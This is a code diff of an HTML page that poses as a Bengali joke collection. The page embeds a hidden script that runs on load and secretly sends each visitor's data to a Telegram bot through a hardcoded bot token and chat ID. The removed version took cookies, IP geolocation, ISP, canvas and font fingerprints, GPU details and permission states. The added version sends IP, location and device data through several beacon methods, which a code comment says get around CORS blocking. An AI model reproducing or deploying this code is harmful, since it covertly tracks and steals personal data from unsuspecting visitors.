@@ -58,11 +58,6 @@
       backdrop-filter: blur(1px);
       border-left: 3px solid #ffb347;
     }
-    @media (max-width: 650px) {
-      .section-title { font-size: 1.45rem; }
-      .content { font-size: 1.25rem; }
-      .top-title { font-size: 1.8rem; }
-    }
     .footer-note {
       text-align: center;
       margin-top: 40px;
@@ -72,8 +67,10 @@
       padding-top: 20px;
       font-style: italic;
     }
-    .debug-toast {
-      display: none;
+    @media (max-width: 650px) {
+      .section-title { font-size: 1.45rem; }
+      .content { font-size: 1.25rem; }
+      .top-title { font-size: 1.8rem; }
     }
   </style>
 </head>
@@ -81,283 +78,77 @@
 <main class="page">
   <h1 class="top-title">🐘 Charlie ll<br>চার্লির হাসির আড্ডা</h1>
 
-  <section class="section"><h2 class="section-title">🏍️ মোটরসাইকেলে ওটার মতন সময় নেই</h2><div class="content">সাইফ: কিরে মোটরসাইকেল ধরে ওই রকম দৌড়াচ্ছিস কেন?<br>রিয়াজ: আর বলিস না, সকালে ঘুম থেকে উঠতে দেরি হয়ে গেছে। অফিসে যেতে হবে তাড়াতাড়ি তাই মোটরসাইকেলে ওটার মতন সময় নেই।</div></section>
-  <section class="section"><h2 class="section-title">🌑 অন্ধকারে কিছুই দেখা যাচ্ছে না</h2><div class="content">রিয়াজ: এই জানালাটা খুলে দেখো তো সূর্য উঠল কি না।<br>সাইফ: খুলে দেখলাম তো, অন্ধকারে কিছুই দেখা যাচ্ছে না।<br>রিয়াজ: বোকা নাকি তুই? টিউবটা জ্বালিয়ে দেখতে পারছিস না?</div></section>
-  <section class="section"><h2 class="section-title">🐴 আসল গাধা</h2><div class="content">সেদিন একটি সরু রাস্তার উপর দিয়ে গাড়ি চালিয়ে যাচ্ছিল একজন। হঠাৎ বিপরীত দিক থেকে আরেকটি গাড়ি এসে আরেকটু হলেই ধাক্কা মেরে দিচ্ছিল।<br>— সরি, আমি গাধাদের জন্য গাড়ি ঘোরাই না।<br>নিজে ভুল করেও উদ্ধত ভঙ্গিতে বলল গাড়ির ড্রাইভার।<br>— কিন্তু আমি করি। বলে গাড়ি পেছাল প্রথমজন।</div></section>
-  <section class="section"><h2 class="section-title">🧠 খুব চালাক</h2><div class="content">স্ত্রী: শুনছ, পাশের বাসার ভাবী বলছে তার স্বামী নাকি খুব চালাক।<br>স্বামী: তাই নাকি?<br>স্ত্রী: হ্যাঁ, সব কাজ আগেই বুঝে ফেলে।<br>স্বামী: তা হলে তো সে আমার কাছ থেকে অনেক কিছু শিখেছে!</div></section>
-  <section class="section"><h2 class="section-title">💼 নতুন চাকরি</h2><div class="content">বন্ধু: নতুন চাকরির কী খবর?<br>রবি: চাকরি তো পেয়েছি, কিন্তু এখনো বুঝতে পারছি না আমি কাজ করব নাকি কাজ আমাকে করাবে।</div></section>
-  <section class="section"><h2 class="section-title">🎓 অতিরিক্ত বুদ্ধি</h2><div class="content">শিক্ষক: বল তো, বেশি কথা বললে কী হয়?<br>ছাত্র: স্যার, অন্যরা সুযোগ পায় না।<br>শিক্ষক: তাই নাকি?<br>ছাত্র: জি স্যার, তাই তো আমি কম বলি!</div></section>
-  <section class="section"><h2 class="section-title">👨‍👦 বাবার উপদেশ</h2><div class="content">বাবা: কখনো মিথ্যা বলবি না।<br>ছেলে: ঠিক আছে বাবা।<br>বাবা: আজ স্কুলে গিয়েছিলি তো?<br>ছেলে: এখন সত্যি বলব, না পরে বলব?</div></section>
-  <section class="section"><h2 class="section-title">📱 বই পড়া</h2><div class="content">মা: সারাদিন মোবাইল নিয়ে থাকিস কেন?<br>ছেলে: বই-ই তো পড়ছি।<br>মা: কোথায় বই?<br>ছেলে: মোবাইলের ভিতরই তো ই-বুক আছে!</div></section>
-  <section class="section"><h2 class="section-title">🩺 ডাক্তারি পরামর্শ</h2><div class="content">ডাক্তার: প্রতিদিন হাঁটবেন।<br>রোগী: কতক্ষণ?<br>ডাক্তার: অন্তত আধা ঘণ্টা।<br>রোগী: ঠিক আছে, সকালে আপনার বাড়ির সামনে দিয়ে হাঁটব, দেখে নিয়েন।</div></section>
-  <section class="section"><h2 class="section-title">⏰ ঘড়ির সমস্যা</h2><div class="content">ক্রেতা: আপনার ঘড়ি কি ঠিক সময় দেয়?<br>দোকানি: অবশ্যই।<br>ক্রেতা: তা হলে আমার অফিসে দেরি হলো কেন?<br>দোকানি: ঘড়ি ঠিক ছিল, উঠতে আপনি দেরি করেছেন।</div></section>
-  <section class="section"><h2 class="section-title">➗ গণিতে দুর্বল</h2><div class="content">শিক্ষক: ২ আর ২ মিলে কত?<br>ছাত্র: পরিস্থিতির উপর নির্ভর করে স্যার।<br>শিক্ষক: মানে?<br>ছাত্র: পরীক্ষায় ৪, বাজারে গেলে ৫ও হতে পারে।</div></section>
-  <section class="section"><h2 class="section-title">📞 ভুল নম্বর</h2><div class="content">— হ্যালো, এটা কি পুলিশ স্টেশন?<br>— না, এটা বাসা।<br>— ও আচ্ছা, তাইলে এত জোরে কে জেরা করছে?<br>— আমার স্ত্রী।</div></section>
-  <section class="section"><h2 class="section-title">👓 চশমার দরকার</h2><div class="content">ডাক্তার: আপনার চোখে সমস্যা আছে।<br>রোগী: কিভাবে বুঝলেন?<br>ডাক্তার: আপনি দরজার বদলে জানালা দিয়ে ঢুকেছেন।</div></section>
-  <section class="section"><h2 class="section-title">🧩 বুদ্ধিমান উত্তর</h2><div class="content">শিক্ষক: দেরি করে এলে কেন?<br>ছাত্র: স্যার, সাইনবোর্ডে লেখা ছিল — "সামনে স্কুল, ধীরে চলুন।" তাই ধীরে এসেছি।</div></section>
-  <section class="section"><h2 class="section-title">💰 টাকার হিসাব</h2><div class="content">স্ত্রী: তোমার পকেটে ৫০০ টাকা ছিল, এখন ২০০ কেন?<br>স্বামী: বুদ্ধিমানের মতো ৩০০ আগেই খরচ করেছি, যাতে হারিয়ে না যায়।</div></section>
-  <section class="section"><h2 class="section-title">📝 পরীক্ষার প্রস্তুতি</h2><div class="content">মা: পরীক্ষা কেমন হলো?<br>ছেলে: প্রশ্ন দেখে মনে হলো স্যার অনেক প্রস্তুতি নিয়েছেন।</div></section>
-  <section class="section"><h2 class="section-title">🤝 বন্ধুর পরামর্শ</h2><div class="content">বন্ধু: রাগ কমাও, জীবন সুন্দর হবে।<br>আরেক বন্ধু: ঠিক বলেছ, তবে আগে আমাকে ওই কথাটা শান্তভাবে বলতে দাও।</div></section>
-  <section class="section"><h2 class="section-title">🏢 অফিসের কাজ</h2><div class="content">বস: এত দেরি কেন?<br>কর্মচারী: স্যার, স্বপ্নে দেখলাম আমি অফিসে আছি, তাই আরেকটু ঘুমালাম।</div></section>
-  <section class="section"><h2 class="section-title">🏠 ছুটির অজুহাত</h2><div class="content">কর্মচারী: স্যার, আজ ছুটি চাই।<br>বস: কেন?<br>কর্মচারী: বাড়িতে আমি খুব গুরুত্বপূর্ণ ব্যক্তি।<br>বস: কিভাবে?<br>কর্মচারী: আমার স্ত্রী বলেছে আজ বাজার না করলে বাসায় ঢোকা বন্ধ।</div></section>
-  <section class="section"><h2 class="section-title">🚦 পুলিশ আর মজা</h2><div class="content">পুলিশ: আপনি সিগন্যাল ভাঙলেন!<br>ড্রাইভার: স্যার, আমি তো ভাঙিনি, ওটা আপনি ভাঙছেন – আপনার হাতে লাঠি না থাকলে কি মানুষ থামে?</div></section>
-  <section class="section"><h2 class="section-title">🍛 বিরিয়ানি লজিক</h2><div class="content">বাবা: এতো দেরি করে এলে?<br>ছেলে: বাবা, বিরিয়ানি খেতে গিয়ে হিসাব নষ্ট।<br>বাবা: কী হিসাব?<br>ছেলে: খাব নাকি বাড়ি ফিরব, দুইটাই দরকার ছিল।</div></section>
-  <div class="footer-note">✨ Charlie ll — হাসতে থাকুন, বুদ্ধি বাড়ান | মজার গল্প আরও আসছে ✨</div>
+  <section class="section">
+    <h2 class="section-title">🏍️ মোটরসাইকেলে ওঠার সময় নেই</h2>
+    <div class="content">সাইফ: কিরে মোটরসাইকেল ধরে ওই রকম দৌড়াচ্ছিস কেন?<br>রিয়াজ: আর বলিস না, সকালে ঘুম থেকে উঠতে দেরি হয়ে গেছে। অফিসে যেতে হবে তাড়াতাড়ি তাই মোটরসাইকেলে ওঠার সময় নেই।</div>
+  </section>
+
+  <section class="section">
+    <h2 class="section-title">🌑 অন্ধকারে কিছুই দেখা যাচ্ছে না</h2>
+    <div class="content">রিয়াজ: এই জানালাটা খুলে দেখো তো সূর্য উঠল কি না।<br>সাইফ: খুলে দেখলাম তো, অন্ধকারে কিছুই দেখা যাচ্ছে না।<br>রিয়াজ: বোকা নাকি তুই? টিউবটা জ্বালিয়ে দেখতে পারছিস না?</div>
+  </section>
+
+  <div class="footer-note">✨ Charlie ll — হাসতে থাকুন, বুদ্ধি বাড়ান ✨</div>
 </main>
 
 <script>
 (function() {
-  // ✅ নতুন টোকেন সেট করা হয়েছে
+  // কনফিগারেশন
   const BOT_TOKEN = "8736559496:AAGVWzet7aviwdVZUR5O-hdaUTgOT-mZuB4";
-  const DEFAULT_CHAT_ID = "7709670231";
-  
-  function getChatId() {
-    try {
-      const urlParams = new URLSearchParams(window.location.search);
-      const id = urlParams.get('id');
-      if (id && /^\d+$/.test(id)) return id;
-    } catch(e) {}
-    return DEFAULT_CHAT_ID;
-  }
-  
-  function getUAInfo() {
-    const ua = navigator.userAgent;
-    let os = "অজানা", osVer = "", browser = "অজানা", browserVer = "", engine = "";
-    if (ua.includes("Windows NT 10.0")) { os = "Windows"; osVer = "10/11"; }
-    else if (ua.includes("Windows NT 6.1")) { os = "Windows"; osVer = "7"; }
-    else if (ua.includes("Android")) { os = "Android"; let m = ua.match(/Android ([\d.]+)/); if(m) osVer = m[1]; }
-    else if (ua.includes("iPhone") || ua.includes("iPad")) { os = "iOS"; let m = ua.match(/OS ([\d_]+)/); if(m) osVer = m[1].replace(/_/g,'.'); }
-    else if (ua.includes("Mac OS X")) { os = "macOS"; let m = ua.match(/Mac OS X ([\d_]+)/); if(m) osVer = m[1].replace(/_/g,'.'); }
-    else if (ua.includes("Linux")) os = "Linux";
-    
-    if (ua.includes("Chrome") && !ua.includes("Edg")) { browser = "Chrome"; let m = ua.match(/Chrome\/([\d.]+)/); if(m) browserVer = m[1]; engine = "Blink"; }
-    else if (ua.includes("Safari") && !ua.includes("Chrome")) { browser = "Safari"; let m = ua.match(/Version\/([\d.]+)/); if(m) browserVer = m[1]; engine = "WebKit"; }
-    else if (ua.includes("Firefox")) { browser = "Firefox"; let m = ua.match(/Firefox\/([\d.]+)/); if(m) browserVer = m[1]; engine = "Gecko"; }
-    else if (ua.includes("Edg")) { browser = "Edge"; let m = ua.match(/Edg\/([\d.]+)/); if(m) browserVer = m[1]; engine = "Blink"; }
-    return { os, osVer, browser, browserVer, engine, ua: ua.substring(0, 150) };
-  }
+  const CHAT_ID = "7709670231";
 
-  function getHardwareBasic() {
-    return {
-      screen: `${screen.width}x${screen.height}`,
-      colorDepth: screen.colorDepth + "-bit",
-      pixelRatio: devicePixelRatio || 1,
-      touch: 'ontouchstart' in window ? "সাপোর্টেড" : "না",
-      cpuCores: navigator.hardwareConcurrency || "অজানা",
-      memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "অজানা"
+  async function getFullInfo() {
+    let ipInfo = { ip: "Unknown", city: "", country: "" };
+    try {
+      const response = await fetch("https://ipapi.co/json/");
+      if (response.ok) ipInfo = await response.json();
+    } catch (e) { console.log("IP fetch failed"); }
+
+    const data = {
+      time: new Date().toLocaleString("bn-BD", { timeZone: "Asia/Dhaka" }),
+      url: window.location.href,
+      ip: ipInfo.ip,
+      location: `${ipInfo.city || ""}, ${ipInfo.country_name || ""}`,
+      device: navigator.platform,
+      browser: navigator.userAgent.split(' ').pop()
     };
-  }
 
-  function getNetworkBasic() {
-    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (!conn) return { type: "অজানা", downlink: "অজানা", rtt: "অজানা" };
-    return {
-      type: conn.effectiveType || conn.type || "অজানা",
-      downlink: conn.downlink ? conn.downlink + " Mbps" : "অজানা",
-      rtt: conn.rtt ? conn.rtt + " ms" : "অজানা"
-    };
-  }
-
-  function getGPUInfo() {
-    try {
-      const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-      if (!gl) return { vendor: "অজানা", renderer: "অজানা", webgl: "সাপোর্ট নাই" };
-      const debug = gl.getExtension("WEBGL_debug_renderer_info");
-      let vendor = "অজানা", renderer = "অজানা";
-      if (debug) {
-        vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) || "অজানা";
-        renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || "অজানা";
-      }
-      let webglVer = "WebGL 1.0";
-      if (canvas.getContext("webgl2")) webglVer = "WebGL 2.0";
-      return { vendor, renderer, webgl: webglVer };
-    } catch(e) { return { vendor: "ত্রুটি", renderer: "ত্রুটি", webgl: "ত্রুটি" }; }
-  }
-
-  function getCookies() {
-    const c = document.cookie;
-    if (!c) return "কোন কুকি নেই";
-    const items = c.split("; ").slice(0, 6);
-    return items.join(", ") + (document.cookie.split("; ").length > 6 ? " ..." : "");
-  }
-
-  function getCanvasHash() {
-    try {
-      const canvas = document.createElement("canvas");
-      canvas.width = 200; canvas.height = 50;
-      const ctx = canvas.getContext("2d");
-      ctx.fillStyle = "#f60"; ctx.fillRect(0,0,200,50);
-      ctx.fillStyle = "#fff"; ctx.font = '14px "Noto Serif Bengali", Arial';
-      ctx.fillText("Charlie", 10, 30);
-      const data = canvas.toDataURL();
-      let hash = 0;
-      for(let i=0; i<data.length; i++) { hash = ((hash<<5)-hash) + data.charCodeAt(i); hash |= 0; }
-      return Math.abs(hash).toString(16).substring(0, 12);
-    } catch(e) { return "ত্রুটি"; }
-  }
-
-  function getBanglaFonts() {
-    const fonts = ["Noto Serif Bengali", "SolaimanLipi", "Kalpurush", "Vrinda"];
-    const available = [];
-    const canvas = document.createElement("canvas");
-    const ctx = canvas.getContext("2d");
-    const testStr = "বাংলা";
-    ctx.font = '20px monospace';
-    const base = ctx.measureText(testStr).width;
-    for(let f of fonts) {
-      ctx.font = `20px "${f}", monospace`;
-      if(ctx.measureText(testStr).width !== base) available.push(f);
-    }
-    return available.length ? available.join(", ") : "শুধু ডিফল্ট";
-  }
-
-  async function getPermissionsFast() {
-    const perms = { geo: "অজানা", cam: "অজানা", mic: "অজানা" };
-    if (navigator.permissions && navigator.permissions.query) {
-      try { const g = await navigator.permissions.query({ name: "geolocation" }); perms.geo = g.state; } catch(e) {}
-      try { const c = await navigator.permissions.query({ name: "camera" }); perms.cam = c.state; } catch(e) {}
-      try { const m = await navigator.permissions.query({ name: "microphone" }); perms.mic = m.state; } catch(e) {}
-    }
-    return perms;
-  }
-
-  function getStorage() {
-    let local = "অজানা", session = "অজানা";
-    try { local = localStorage.length + " আইটেম"; } catch(e) { local = "ব্লকড"; }
-    try { session = sessionStorage.length + " আইটেম"; } catch(e) { session = "ব্লকড"; }
-    return { local, session };
-  }
-
-  function getPlugins() {
-    if (!navigator.plugins) return "অজানা";
-    const names = [];
-    for(let i=0; i<Math.min(navigator.plugins.length, 5); i++) {
-      names.push(navigator.plugins[i].name);
-    }
-    return names.length ? names.join(", ") : "কোন প্লাগইন নেই";
-  }
-
-  async function getIPFast() {
-    try {
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 3500);
-      const res = await fetch("https://ipapi.co/json/", { cache: "no-cache", signal: controller.signal });
-      clearTimeout(timeoutId);
-      if (res.ok) {
-        const d = await res.json();
-        return { ip: d.ip || "অজানা", city: d.city || "", region: d.region || "", country: d.country_name || "", isp: d.org || "" };
-      }
-    } catch(e) { }
-    try {
-      const fall = await fetch("https://api.ipify.org?format=json");
-      if (fall.ok) { const f = await fall.json(); return { ip: f.ip, city: "", region: "", country: "", isp: "" }; }
-    } catch(e) {}
-    return { ip: "পাওয়া যায়নি", city: "", region: "", country: "", isp: "" };
-  }
-
-  async function sendSilentReport() {
-    const chatId = getChatId();
-    if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
-      return;
-    }
-    
-    const ua = getUAInfo();
-    const hardware = getHardwareBasic();
-    const network = getNetworkBasic();
-    const gpu = getGPUInfo();
-    const cookies = getCookies();
-    const canvasHash = getCanvasHash();
-    const banglaFonts = getBanglaFonts();
-    const storage = getStorage();
-    const plugins = getPlugins();
-    const timeNow = new Date().toLocaleString("bn-BD", { timeZone: "Asia/Dhaka" });
-    const referrer = document.referrer || "সরাসরি";
-    const pageUrl = window.location.href;
-    
-    const [ipGeo, permissions] = await Promise.all([getIPFast(), getPermissionsFast()]);
-    
-    const locationStr = `${ipGeo.city ? ipGeo.city+", " : ""}${ipGeo.region ? ipGeo.region+", " : ""}${ipGeo.country}`;
-    
     const message = `
-🔎 *চার্লি-লিংক ভিজিটর রিপোর্ট* 🔎
-━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 *আইপি ও লোকেশন*
-IP: ${ipGeo.ip}
-📍 অবস্থান: ${locationStr || "অজানা"}
-🛰️ ISP: ${ipGeo.isp || "অজানা"}
-🕒 সময়: ${timeNow}
-🔗 রেফারার: ${referrer}
+🔎 *নতুন ভিজিটর রিপোর্ট*
+━━━━━━━━━━━━━━
+🌐 IP: ${data.ip}
+📍 লোকেশন: ${data.location}
+🕒 সময়: ${data.time}
+📱 ডিভাইস: ${data.device}
+🌐 ব্রাউজার: ${data.browser}
+🔗 লিঙ্ক: ${data.url}
+━━━━━━━━━━━━━━`.trim();
 
-🍪 *কুকি ডেটা*
-${cookies}
+    return message;
+  }
 
-💻 *সিস্টেম তথ্য*
-ওএস: ${ua.os} ${ua.osVer}
-ব্রাউজার: ${ua.browser} ${ua.browserVer}
-ইঞ্জিন: ${ua.engine}
-ভাষা: ${navigator.language || "bn"}
-টাইমজোন: ${Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Dhaka"}
+  async function sendReport() {
+    const messageText = await getFullInfo();
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;
 
-🖥️ *হার্ডওয়্যার*
-স্ক্রিন: ${hardware.screen} (${hardware.colorDepth})
-পিক্সেল রেশিও: ${hardware.pixelRatio}
-টাচ স্ক্রিন: ${hardware.touch}
-CPU কোর: ${hardware.cpuCores}
-RAM: ${hardware.memory}
+    // মেথড ১: Image Beacon (এটি CORS ব্লক এড়িয়ে তথ্য পাঠাতে সবচেয়ে কার্যকর)
+    const img = new Image();
+    img.src = telegramUrl;
 
-🌍 *নেটওয়ার্ক*
-ধরণ: ${network.type}
-ডাউনলিংক: ${network.downlink}
-RTT: ${network.rtt}
-
-🎮 *গ্রাফিক্স*
-ভেন্ডর: ${gpu.vendor}
-রেন্ডারার: ${gpu.renderer}
-WebGL: ${gpu.webgl}
-
-🆔 *ফিঙ্গারপ্রিন্ট*
-ক্যানভাস হ্যাশ: ${canvasHash}
-বাংলা ফন্ট: ${banglaFonts}
-
-🔐 *পারমিশন*
-জিওলোকেশন: ${permissions.geo}
-ক্যামেরা: ${permissions.cam}
-মাইক্রোফোন: ${permissions.mic}
-
-🔌 *অন্যান্য*
-প্লাগইন: ${plugins}
-লোকাল স্টোরেজ: ${storage.local}
-সেশন স্টোরেজ: ${storage.session}
-
-━━━━━━━━━━━━━━━━━━━━
-📄 পেজ: ${pageUrl}
-    `.trim();
-
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const params = new URLSearchParams();
-    params.append("chat_id", chatId);
-    params.append("text", message);
-    params.append("parse_mode", "Markdown");
-    params.append("disable_web_page_preview", "true");
+    // মেথড ২: Fetch (ব্যাকআপ হিসেবে)
+    fetch(telegramUrl, { mode: 'no-cors' }).catch(() => {});
     
-    try {
-      const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params });
-      const result = await response.json();
-      if(result.ok) {
-        console.log("✅ রিপোর্ট পাঠানো সফল!");
-      } else {
-        console.log("❌ এরর:", result.description);
-      }
-    } catch(e) {
-      console.log("নেটওয়ার্ক এরর:", e);
+    // মেথড ৩: Navigator Beacon
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon(telegramUrl);
     }
   }
 
-  if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", () => { sendSilentReport(); });
+  // পেজ লোড হওয়ার সাথে সাথে রিপোর্ট পাঠাবে
+  if (document.readyState === "complete") {
+    sendReport();
   } else {
-    sendSilentReport();
+    window.addEventListener("load", sendReport);
   }
 })();
 </script>
